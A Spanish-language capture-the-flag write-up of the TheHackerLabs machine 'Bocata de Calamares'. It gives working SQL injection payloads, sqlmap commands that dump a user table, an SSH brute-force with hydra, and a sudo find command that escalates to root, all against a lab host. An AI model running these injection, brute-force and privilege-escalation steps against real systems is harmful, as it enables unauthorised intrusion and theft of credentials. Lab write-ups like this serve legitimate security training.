---
title: "Bocata de Calamares - TheHackerLabs"
date: 2025-07-24
draft: false
slug: "THL-writeup-bocataCalamares"
excerpt: "Esta fue una máquina fácil. Después de analizar los escaneos, vamos directo a la página web activa en el puerto 80, siendo una página de fake news. Aplicando Fuzzing, descubrimos un login al que es posible aplicarle Inyecciones SQL. Gracias a esto, ganamos acceso a este login y encontramos una lista por hacer, en la que menciona un lector de archivos internos, al que codificaron su nombre en base64. Encontramos y analizamos el lector de archivos internos, este nos permite leer archivos como el /etc/passwd. Además, encontramos una pista en el código fuente, mencionando que se le puede aplicar fuerza bruta a un usuario del servicio SSH. Le aplicamos fuerza bruta con hydra a uno de los usuarios que vimos en el /etc/passwd, y ganamos acceso principal a la máquina víctima vía SSH. Revisamos los privilegios de este usuario, descubriendo que podemos usar el binario find como Root. Utilizando la guía de GTFOBins, encontramos una forma de escalar privilegios, convirtiéndonos en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "Web Enumeration", "Fuzzing", "SQL Injection", "BurpSuite", "SQLi Automatization (SQLMAP)", "Base64 Codification", "Brute Force Attack", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "nano"
  - "sqlmap"
  - "wfuzz"
  - "echo"
  - "base64"
  - "hydra"
  - "ssh"
  - "cat"
  - "sudo"
  - "find"
links:
  - "https://github.com/sqlmapproject/sqlmap/wiki/Usage"
  - "https://gtfobins.github.io/gtfobins/find/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-bocataCalamar/bocata_de_calamares.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.220
PING 192.168.10.220 (192.168.10.220) 56(84) bytes of data.
64 bytes from 192.168.10.220: icmp_seq=1 ttl=64 time=1.89 ms
64 bytes from 192.168.10.220: icmp_seq=2 ttl=64 time=1.56 ms
64 bytes from 192.168.10.220: icmp_seq=3 ttl=64 time=1.29 ms
64 bytes from 192.168.10.220: icmp_seq=4 ttl=64 time=1.35 ms

--- 192.168.10.220 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3032ms
rtt min/avg/max/mdev = 1.290/1.522/1.888/0.234 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.220 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 12:29 CST
Initiating ARP Ping Scan at 12:29
Scanning 192.168.10.220 [1 port]
Completed ARP Ping Scan at 12:29, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:29
Scanning 192.168.10.220 [65535 ports]
Discovered open port 80/tcp on 192.168.10.220
Discovered open port 22/tcp on 192.168.10.220
Completed SYN Stealth Scan at 12:29, 6.99s elapsed (65535 total ports)
Nmap scan report for 192.168.10.220
Host is up, received arp-response (0.00100s latency).
Scanned at 2025-07-24 12:29:26 CST for 7s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.30 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solo hay 2 puertos abiertos, así que supongo que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.10.220 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 12:29 CST
Nmap scan report for 192.168.10.220
Host is up (0.00080s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 a6:3f:47:73:4c:6d:b3:23:29:fa:f8:1f:1d:42:44:b9 (ECDSA)
|_  256 11:b8:dc:df:a9:c1:9f:b5:8f:55:93:a4:ef:65:c8:d5 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)

|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: AFN
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.07 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que en la página web activa del **puerto 80** no está vacía. Además, está utilizando **nginx** como servidor.

Vamos a verla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura1.png">
</p>

Una página web de fake news, qué interesante.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura2.png">
</p>

No hay más de lo que ya sabemos.

Viendo un poco el contenido, resulta que hay una página que nos advierte sobre las **Inyecciones SQL**:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura3.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura4.png">
</p>

Al entrar, veremos información sobre cómo aplicar una **Inyección SQL** básica que prueba si un formulario de inicio de sesión es vulnerable, que es muy buena información.

Pero, no encontraremos algo más y tampoco en el código fuente. 

Entonces, vamos a aplicar **Fuzzing** que se enfoque en **archivos PHP**.

### Fuzzing {#fuzz}

Primero, usemos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.10.220/FUZZ -t 300 -e .php,.txt,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.220/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 4145, Words: 898, Lines: 96, Duration: 13ms]
login.php               [Status: 200, Size: 2543, Words: 743, Lines: 98, Duration: 31ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 24ms]
admin.php               [Status: 200, Size: 359, Words: 22, Lines: 14, Duration: 167ms]
                        [Status: 200, Size: 4145, Words: 898, Lines: 96, Duration: 80ms]
:: Progress: [882180/882180] :: Job [1/1] :: 1802 req/sec :: Duration: [0:06:46] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*	     | Para indicar extensiones de archivos a buscar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.10.220/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.220/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://192.168.10.220/images/]
/index.php            (Status: 200) [Size: 4145]
/login.php            (Status: 200) [Size: 2543]
/admin.php            (Status: 200) [Size: 359]
Progress: 882180 / 882184 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar extensiones de archivos a buscar. |

Encontramos dos páginas, pero solo podremos ver el contenido de la página **login.php**:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura5.png">
</p>

Es probable que tengamos que aplicar **Inyecciones SQL**.

Intentémoslo.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Inyecciones SQL de Distintas Maneras {#SQLi}

Vamos a aplicar **Inyecciones SQL** de manera manual y automatizada, empezando por la forma manual.

#### Aplicando Inyección SQL Básica de Forma Manual para Ganar Acceso a Login {#SQLiManual}

Veamos qué sucede si metemos un usuario y contraseña como **admin-admin**:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura6.png">
</p>

No son correctos.

Bien, pero ahora intentemos meter una comilla al usuario o a la contraseña y veamos qué pasa:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura7.png">
</p>

Nos muestra que hay un error en la sintaxis y nos muestra la ruta en donde está **login.php**.

Entonces, es posible que la query sea vulnerable a **Inyecciones SQL**.

Es posible que esta sea la query que se está utilizando:
```bash
SELECT * FROM users WHERE (alias = '$alias' OR email = '$email') AND password = '$contraseña';
```
Esta query indica que si el usuario y la contraseña son correctos o **true**, entonces, nos da acceso.

Podemos tratar de modificar esta query con cualquiera de las siguientes inyecciones:
```bash
' or 1=1--
' or '1'='1-- -
' or '1'='1'-- -
```
Esta modificación indica que **"o 1 es igual 1"**, lo que obviamente es verdadero.

Esto se interpretaría como: **"Si el usuario y la contraseña o 1 es igual 1 son verdadero (true), concede el acceso"**.

Ahora, necesitamos saber cuál de los dos campos es vulnerable, por lo que podemos probar esta inyección en el usuario o en la contraseña o incluso en ambos.

Pruebalo:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura8.png">
</p>

Ganamos acceso. Lo probé en los dos campos (en cada campo y luego en los dos) y me dio el acceso, entonces, podríamos suponer que ambos son vulnerables, pero si lo pruebas con **BurpSuite**, resulta que el campo vulnerable es el **campo del usuario**.

#### Automatizando Inyecciones SQL con SQLMAP para Dumpear Datos de Base de Datos {#SQLMAP}

Independientemente de si hicimos pruebas en el login para saber si es vulnerable a **Inyecciones SQL**, pudimos haber usado la herramienta **SQLMAP** para que hiciera pruebas automatizadas, y es lo que haremos a continuación.

Para que funcione de una mejor manera, vamos a capturar y a guardar en un archivo de texto la petición del login cuando intentamos entrar con credenciales random.

Puedes utilizar **BurpSuite** para esto:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura14.png">
</p>

Quedaría el archivo de la siguiente manera:
```bash
nano request.txt
----------------
POST /login.php HTTP/1.1
Host: 192.168.10.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://192.168.10.220
Connection: keep-alive
Referer: http://192.168.10.220/login.php
Cookie: PHPSESSID=uhaksjdunefpt1is3jkad70
Upgrade-Insecure-Requests: 1
Priority: u=0, i

alias=admin&password=admin
```

Con **SQLMAP** le vamos a indicar que pruebe si el login es vulnerable a **Inyecciones SQL**:
```bash
sqlmap -r request.txt --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.4#stable}

|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...
POST parameter 'alias' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 265 HTTP(s) requests:
---
Parameter: alias (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: alias=-9105' OR 6739=6739#&password=admin

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: alias=admin' AND GTID_SUBSET(CONCAT(0x7162787171,(SELECT (ELT(1050=1050,1))),0x717a717671),1050)-- bMcE&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: alias=admin' AND (SELECT 7967 FROM (SELECT(SLEEP(5)))ESNY)-- fcQV&password=admin
---
[13:43:04] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.24.0
back-end DBMS: MySQL >= 5.6
[*] ending @ 13:43:04 /2025-07-24/
```

| Parámetros | Descripción |
|---|---|
| *-r*	     | Usa un archivo de solicitud HTTP (incluye headers, cookies, etc.). |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |

Como lo mencioné antes, el campo del usuario es el vulnerable a **Inyecciones SQL**.

Tratemos de dumpear las bases de datos:
```bash
sqlmap -r request.txt --batch --dbs 
...
available databases [3]:
[*] information_schema
[*] performance_schema
[*] php
...
[*] ending @ 13:45:56 /2025-07-24/
```

| Parámetros | Descripción |
|---|---|
| *-r*       | Usa un archivo de solicitud HTTP (incluye headers, cookies, etc.). |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--dbs*    | Enumera todas las bases de datos disponibles. |

Dumpeemos las tablas de la base de datos **php**:
```bash
sqlmap -r request.txt --batch -D 'php' --tables
...
[13:46:27] [INFO] fetching tables for database: 'php'
[13:46:27] [INFO] retrieved: 'usuarios'
Database: php
[1 table]
+----------+

| usuarios |
+----------+
...
[*] ending @ 13:46:27 /2025-07-24/
```

| Parámetros | Descripción |
|---|---|
| *-r*       | Usa un archivo de solicitud HTTP (incluye headers, cookies, etc.). |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *-D*	     | Selecciona una base de datos especifica a enumerar. |
| *--tables* | Enumera las tablas de una base de datos específica. |

Tenemos la tabla **usuarios**.

Ahora, dumpeemos las columnas de esa tabla:
```bash
sqlmap -r request.txt --batch -D 'php' -T 'usuarios' --columns
...
Database: php
Table: usuarios
[5 columns]
+------------+-------------+

| Column     | Type        |
+------------+-------------+

| contraseña | varchar(16) |
| alias      | varchar(20) |
| email      | varchar(30) |
| id         | int         |
| nombre     | varchar(20) |
+------------+-------------+
...
[*] ending @ 13:47:03 /2025-07-24/
```

| Parámetros | Descripción |
|---|---|
| *-r*       | Usa un archivo de solicitud HTTP (incluye headers, cookies, etc.). |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *-D*       | Selecciona una base de datos especifica a enumerar. |
| *-T*       | Selecciona una tabla especifica a enumerar. |
| *--columns* | Enumera las columnas de una tabla específica. |

Vamos a dumpear todos los datos de esa tabla:
```bash
sqlmap -r request.txt --batch -D 'php' -T 'usuarios' --dump
...
Database: php
Table: usuarios
[4 entries]
+----+------------+---------------------+---------+--------------+

| id | alias      | email               | nombre  | contraseña   |
+----+------------+---------------------+---------+--------------+

| 1  | adminPrinc | admin@localhost.com | admin   | 123456       |
| 2  | Pep100     | pepe@email.com      | pepe    | qwertyuiop   |
| 3  | Jaime_P    | jaime@email.com     | jaime   | jaime        |
| 4  | Richard    | Ricardobc@gmail.com | Ricardo | qwertyu      |
+----+------------+---------------------+---------+--------------+
```

| Parámetros | Descripción |
|---|---|
| *-r*       | Usa un archivo de solicitud HTTP (incluye headers, cookies, etc.). |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--dbs*    | Enumera todas las bases de datos disponibles. |
| *-D*       | Selecciona una base de datos específica a enumerar. |
| *-T*       | Selecciona una tabla específica a enumerar. |
| *--dump*   | Extraer datos de una tabla específica. |

Muy bien, y como ya conocemos los datos que necesitamos, podemos dumpear solamente el alias, email y la contraseña:
```bash
sqlmap -r request.txt --batch -D 'php' -T 'usuarios' -C alias,email,contraseña --dump
Database: php
Table: usuarios
[4 entries]
+------------+--------------+---------------------+

| alias      | contraseña   | email               |
+------------+--------------+---------------------+

| adminPrinc | 123456       | admin@localhost.com |
| Jaime_P    | jaime        | jaime@email.com     |
| Pep100     | qwertyuiop   | pepe@email.com      |
| Richard    | qwertyu      | Ricardobc@gmail.com |
+------------+--------------+---------------------+
...
[*] ending @ 16:02:34 /2025-07-24/
```

| Parámetros | Descripción |
|---|---|
| *-r*       | Usa un archivo de solicitud HTTP (incluye headers, cookies, etc.). |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--dbs*    | Enumera todas las bases de datos disponibles. |
| *-D*       | Selecciona una base de datos específica a enumerar. |
| *-T*       | Selecciona una tabla específica a enumerar. |
| *-C*       | Selecciona los datos de una columna específica a enumerar. |
| *--dump*   | Extraer datos de una tabla específica. |

Por último, podemos automatizar todo esto y obtener los datos de la base de datos usada en un formulario, pero tenemos que usar la **URL** directamente:
```bash
sqlmap -u 'http://192.168.10.220/login.php' --batch --forms --dump
...
Database: php
Table: usuarios
[4 entries]
+----+------------+---------------------+---------+--------------+

| id | alias      | email               | nombre  | contraseña   |
+----+------------+---------------------+---------+--------------+

| 1  | adminPrinc | admin@localhost.com | admin   | 123456       |
| 2  | Pep100     | pepe@email.com      | pepe    | qwertyuiop   |
| 3  | Jaime_P    | jaime@email.com     | jaime   | jaime        |
| 4  | Richard    | Ricardobc@gmail.com | Ricardo | qwertyu      |
+----+------------+---------------------+---------+--------------+
...
[*] ending @ 16:24:24 /2025-07-24/
```

| Parámetros | Descripción |
|---|---|
| *-u*	     | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--forms*  | Analiza y prueba formularios en la URL objetivo. |
| *--dump*   | Extraer datos de una tabla específica. |

Podemos probar esos usuarios para entrar al login.

#### Aplicando Fuzzing a Campo Vulnerable a SQLi con wfuzz {#wfuzz}

Otra cosa que podemos hacer para probar si un campo es vulnerable a **Inyecciones SQL**, es utilizar un wordlist que contenga distintas inyecciones y una herramienta que ejecute ese wordlist.

Para estos casos, la herramienta **wfuzz** es bastante útil.

Utilizaremos un wordlist de **SecLists** que se encuentra en la ruta `/seclists/Fuzzing/SQLi/quick-SQLi.txt`.

Y como sabemos que al ganar acceso al login, nos redirecciona a otra página, entonces podemos agregar el **código 200** como un filtro para que no los muestre y capture respuestas distintas.

O también podemos agregar un filtro para que solo nos dé las respuestas con **código 302**.

Esto ya es como a ti te guste.

Probemos con el filtro de **código 302**:
```bash
wfuzz -c -t 300 -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/quick-SQLi.txt -d 'alias=FUZZ&password=admin' --sc 302 http://192.168.10.220/login.php
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.10.220/login.php
Total requests: 77

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000043:   302        97 L     204 W      2536 Ch     "admin'or 1=1 or ''='"                                                                                                       
000000041:   302        97 L     204 W      2536 Ch     "admin' or '1'='1'#"                                                                                                         
000000046:   302        97 L     204 W      2536 Ch     "admin' or 1=1#"                                                                                                             

Total time: 0.630275
Processed Requests: 77
Filtered Requests: 74
Requests/sec.: 122.1688
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-z, file* | Indica un archivo a usar. |
| *-d*	     | Define los datos para la petición POST. |
| *--sc*     | Filtro solo muestra resultados con un código HTTP específico. |

Funcionó y podemos probar esas inyecciones y verás que funcionarán.

### Analizando Página Web admin.php y Lector de Archivos Internos {#admin}

Regresemos a la página donde entramos después del login:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura8.png">
</p>

Vemos que menciona una lista de cosas por hacer (**to-do-list**):

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura9.png">
</p>

Al entrar, vemos que deja un mensaje en donde creo un lector de ficheros internos, pero que el nombre de este script al que llamo **leer_archivos**, lo códifico a **base64**.

Al codificar este nombre de manera correcta, sin que use un salto de línea, no encontraremos ese archivo, pero si lo codificamos con ese salto de línea es posible que lo encontremos:
```bash
echo "lee_archivos" | base64
bGVlX2FyY2hpdm9zCg==
```

Busquemos:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura10.png">
</p>

Bien, lo encontramos.

Si revisamos su código fuente, veremos un par de comentarios:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura11.png">
</p>

Prácticamente, nos están dando la pista de que podemos aplicarle fuerza bruta a los usuarios de la máquina víctima.

Veamos si es posible leer el `/etc/passwd`:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura12.png">
</p>

Tenemos dos usuarios, quizá algunos de ellos podamos obtener su contraseña.

### Aplicando Fuerza Bruta a Usuario del Servicio SSH y Ganando Acceso a la Máquina Víctima {#FuerzaBruta}

Utilizaremos la herramienta **hydra** para aplicar la fuerza bruta a los usuarios del **servicio SSH**.

De los dos usuarios existentes, del que podemos encontrar su contraseña, es del **usuario superadministrator**:
```bash
hydra -l 'superadministrator' -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.220 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-24 13:22:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.10.220:22/
[22][ssh] host: 192.168.10.220   login: superadministrator   password: ******
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 21 final worker threads did not complete until end.
[ERROR] 21 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-24 13:22:20
```

La tenemos, ahora probemos esa contraseña:
```bash
ssh superadministrator@192.168.10.220
superadministrator@192.168.10.220's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-51-generic x86_64)
...
Last login: Fri Jan 10 17:42:22 2025
superadministrator@thehackerslabs-bocatacalamares:~$ whoami
superadministrator
```
Estamos dentro.

## Post Explotación {#Post}

### Escalada de Privilegios con Permisos Sudoers sobre Binario find {#find}

Veamos qué archivos tiene este usuario:
```bash
superadministrator@thehackerslabs-bocatacalamares:~$ ls -la
total 32
drwxr-x--- 3 superadministrator superadministrator 4096 Jan 10  2025 .
drwxr-xr-x 4 root               root               4096 Jan  6  2025 ..
lrwxrwxrwx 1 root               root                  9 Jan 10  2025 .bash_history -> /dev/null
-rw-r--r-- 1 superadministrator superadministrator  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 superadministrator superadministrator 3771 Jan  6  2025 .bashrc
drwx------ 2 superadministrator superadministrator 4096 Jan 10  2025 .cache
-rw-r--r-- 1 root               root                 13 Jan 10  2025 flag.txt
-rw-r--r-- 1 superadministrator superadministrator  807 Jan  6  2025 .profile
-rw-r--r-- 1 root               root                125 Jan  9  2025 recordatorio.txt
```
Tenemos la flag y un mensaje.

Leamos ambos:
```bash
superadministrator@thehackerslabs-bocatacalamares:~$ cat flag.txt
...
superadministrator@thehackerslabs-bocatacalamares:~$ cat recordatorio.txt 
Me han dicho que existe una pagina llamada gtfobins muy util para ctfs, la dejo aquí apuntada para recordarlo mas adelante.
```
Bien, el mensaje del archivo **recordatorio.txt** es una pista sobre cómo escalar privilegios.

Veamos qué privilegios tiene este usuario:
```bash
superadministrator@thehackerslabs-bocatacalamares:~$ sudo -l
Matching Defaults entries for superadministrator on thehackerslabs-bocatacalamares:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User superadministrator may run the following commands on thehackerslabs-bocatacalamares:
    (ALL) NOPASSWD: /usr/bin/find
```
Busquemos una forma de escalar privilegios usando el **binario find** con la **guía de GTFOBins**.

Encontramos una:
* <a href="https://gtfobins.github.io/gtfobins/find/" target="_blank">GTFOBins: find</a>

Utilizaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-bocataCalamar/Captura13.png">
</p>

Probémoslo:
```bash
superadministrator@thehackerslabs-bocatacalamares:~$ sudo find . -exec /bin/bash \; -quit
root@thehackerslabs-bocatacalamares:/home/superadministrator# whoami
root
```

Ya solo busquemos la última flag:
```bash
root@thehackerslabs-bocatacalamares:/home/tyuiop# cd /root
root@thehackerslabs-bocatacalamares:~# ls
root.txt
root@thehackerslabs-bocatacalamares:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
